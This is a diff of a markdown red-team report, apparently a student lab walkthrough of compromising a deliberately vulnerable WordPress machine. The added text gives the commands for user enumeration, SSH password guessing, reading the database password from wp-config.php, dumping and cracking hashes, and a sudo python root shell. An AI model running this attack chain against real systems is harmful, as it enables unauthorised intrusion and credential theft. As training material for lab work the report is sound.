@@ -38,8 +38,17 @@
 -  The following vulnerabilities were identified on the target Machine:
     -  1.  Wordpress user enumeration;
     -  2.  Weak user password
-    -  3.  User password hash unsalted
-    -  4.  Able to escalate user privilege to root
+    -  3.  Able to obtain password for MySQL DB and start a session
+    -  4.  Unsalted password hashes able to penetrate target machine and escalate user privilege to root
+
+## Exploitatoin of Vulnerabilities
+
+### Wordpress user enumeration: 
+   - **Command Used** WordPress User Enumeration Scan:  wpscan --url http://192.168.1.110/wordpress --enumerate u
+
+  -  **Vulnerability** CVE-2017-5487:  Scan enumerates user names and other possibly vulnerable paths and files.
+
+  -  **Rating** Base Score: 5.3 Medium
 
 As can be seen below the scan was successful in enumerating valid usernames of **Steven & Michael**
 
@@ -47,56 +56,65 @@ As can be seen below the scan was successful in enumerating valid usernames of *
 
 <img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/wpscan%20enumeration%201.png" width="400" height="400"> <img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/wpscan%20enumeration_2.png" width="400" height="400">
 
-## Exploitatoin of Vulnerabilities
-
--  Wordpress user enumeration: 
-   - **Command Used** WordPress User Enumeration Scan:  wpscan --url http://192.168.1.110/wordpress --enumerate u
-
-  -  **Vulnerability** CVE-2017-5487:  Scan enumerates user names and other possibly vulnerable paths and files.
-
-  -  **Rating** Base Score: 5.3 Medium
-
--  Weak user password:
-  -  Weak user passwords made it possible to guess and SSH into the target machine with **Username - Michael**.
+### Weak user password:
+  -  Weak user passwords made it possible  ssh into user shell with **Username - Michael** (Image Below).
      -  ssh michael@192.168.1.110
         -  PW = michael
-  -  After login as Michael was able to 'cd' into directories run 'ls' and found **Flag One** in the following directory and file:
-     -  /var/www/html/service.html
-     -  cat service.html
- 
-  <img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/flag-1.png" width="900" height="400">
-  
+  -  After login as Michael was able to traverse through directories and files where and found **Flag One & Flag Two** (Image/s Below):
+     - Flag One = b9bbcb33ellb80be759c4e844862482d  
+       -  /var/www/html/service.html
+       -  nano service.html
+     - Flag Two = fc3fd58dcdad9ab23faca6e9a3e581c
+       -  /var/www/
+       -  ls
+       -  cat flag2.txt
+  -  Able to find password to MySQL DB in the following direcotry and file (Image Below):
+     -  /var/www/html/wp-config.php
+     -  nano wp-config.php
+     -  MySQL DB PW: R@v3nSecurity
 
-### Exploitation
+<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/flag-1.png" width="900" height="400">
+<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/MySQL_PW.png" width="400" height="400"> 
+<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/flag%202.png" width="900" height="200">
+     
+     
+### Login To MySQL Database
+  -  **Command/s Used** (See Images Below)
+     -  mysql --user=root --password=R@v3nSecurity
+     -  show database;
+     -  use wordpress;
+     -  show tables;
+     -  select * from wp_users;
+     -  select * from wp_posts;
+        - **Flag3 Found** = afc01ab56b50591e7dccf93122770cd2
+  -  Using the commands above was able to find and dump password hash for **Steven**
+     -  created file on Kali Attack Machine for password hashes
+        -  Command used: touch wp_hashes.txt
+        -  nano wp_hashes.txt and added hashes
+     -  using john the ripper obtained **Steven** password
+        -  Command: john wp_hashes.txt
+        -  PW = *pink84*
 
-TODO: Fill out the details below. Include screenshots where possible.
+<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/mysql%20show%20database.png" width="300" height="300"> <img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/use%20wordpress.png" width="300" height="300"> 
+<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/flag%203.png" width="900" height="300">
+<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/select%20*%20from%20wp_users.png" width="900" height="200">
+<img src="" width="" height="">
+<img src="" width="" height="">
+<img src="" width="" height="">
+<img src="" width="" height="">
+
+### Able to establish user shell on target machine
+  -  Logged in using **Steven** credentials
+     -  ssh steven@192.168.1.110
+     -  pw *pink84*
+     -  escalated to root using: sudo -l
+  -  Using python was able to penetrate target machine
+     -  sudo python -c 'import pty;pty.spawn("/bin/bash")'
+  -  Traversed the direcotry and found Flag 4
+     -  **Flag4** 715dea6c055b9fe3337544932f2941ce
+     -  cat flag4.txt
+
+<img src="https://github.com/Tamie13/Red-Team-Summary-of-Operations/blob/main/Attack%20Target%201%20Images/Escate%20to%20root%20using%20python.png">
 
 
--  The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
-
-#### Target 1
-
-
-flag1.txt: TODO: Insert flag1.txt hash value
-
-
-### Exploit Used
-
-TODO: Identify the exploit used
-
-
-TODO: Include the command run
-
-
-
-
-
-flag2.txt: TODO: Insert flag2.txt hash value
-
-
-### Exploit Used
-
-TODO: Identify the exploit used
-
-TODO: Include the command run# Red-Team-Summary-of-Operations
 
